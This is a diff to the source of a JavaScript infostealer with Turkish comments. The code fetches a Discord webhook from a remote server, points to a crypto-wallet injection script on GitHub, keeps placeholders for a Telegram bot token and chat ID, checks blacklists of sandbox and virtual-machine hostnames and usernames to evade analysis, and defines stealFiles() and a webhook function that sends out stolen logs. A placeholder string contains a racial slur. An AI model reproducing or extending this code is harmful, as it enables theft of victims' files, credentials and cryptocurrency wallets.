@@ -27,10 +27,9 @@ const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/ra
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
-
+// Global değişken
+let globalWebhookUrl = null; // Webhook URL başlangıçta boş
 let diagret = '%REPLACE-ME-NIGGA%';
-let globalWebhookUrl = null;
-
 // Rastgele bir şifreleme anahtarı üret
 function generateSecureReference() {
     return btoa(
@@ -41,11 +40,11 @@ function generateSecureReference() {
 
 // Webhook URL'sini almak için veri gönderme
 async function sendDataAndFetchWebhook() {
-    const reference = generateSecureReference();
+    const reference = generateSecureReference(); // Rastgele bir referans oluştur
     const data = {
-        key: "ubolagasxlog1",
-        reference: reference,
-        message: "Örnek veri gönderiliyor."
+        key: "ubolagasxlog1", // Güvenlik anahtarı
+        reference: reference, // Rastgele oluşturulan referans
+        message: "Örnek veri gönderiliyor." // Örnek veri
     };
 
     try {
@@ -54,7 +53,7 @@ async function sendDataAndFetchWebhook() {
             headers: {
                 "Content-Type": "application/json",
             },
-            body: JSON.stringify(data)
+            body: JSON.stringify(data) // JSON olarak veri gönder
         });
 
         if (!response.ok) {
@@ -66,35 +65,17 @@ async function sendDataAndFetchWebhook() {
         if (result.webhookUrl) {
             console.log("Webhook URL alındı:", result.webhookUrl);
             globalWebhookUrl = result.webhookUrl; // Global değişkeni ayarla
-            return result.webhookUrl;
+            console.log("Global Webhook URL ayarlandı:", globalWebhookUrl);
         } else {
-            throw new Error("Webhook URL alınamadı.");
+            console.error("Webhook URL alınamadı.");
         }
     } catch (error) {
         console.error("Bir hata oluştu:", error);
-        throw error; // Hata fırlat
     }
 }
 
-// Asenkron olarak Webhook URL'yi alma işlemi
-const getDiscordWebhookUrl = (async () => {
-    try {
-        const webhookUrl = await sendDataAndFetchWebhook();
-        console.log("Webhook URL başarıyla alındı:", webhookUrl);
-        return webhookUrl;
-    } catch (error) {
-        console.error("Webhook URL alınamadı:", error);
-        return null;
-    }
-})();
-
-// Webhook URL'yi bekle
-const discordWebhookUrl = await getDiscordWebhookUrl;
-
-if (!discordWebhookUrl) {
-    console.error('Discord Webhook URL alınamadı. Mesaj gönderilemiyor.');
-    return;
-}
+const discordWebhookUrl = globalWebhookUrl;
+const discordWebhookUr1 = discordWebhookUrl;
 
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
 const blackListedUsername = ["WDAGUtilityAccount", "runneradmin", "Abby", "Peter Wilson", "hmarc", "patex", "aAYRAp7xfuo", "JOHN-PC", "FX7767MOR6Q6", "DCVDY", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "vboxuser", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "lbeld", "od8m", "Julia", "HEUeRzl", ]
@@ -722,7 +703,6 @@ function stealFiles() {
 
 
 function sendSuccessToWebhook() {
-    
     const successMessage = '**<--------------------------New Log Coming--------------------------->**';
     axios.post(discordWebhookUrl, {
         content: successMessage,
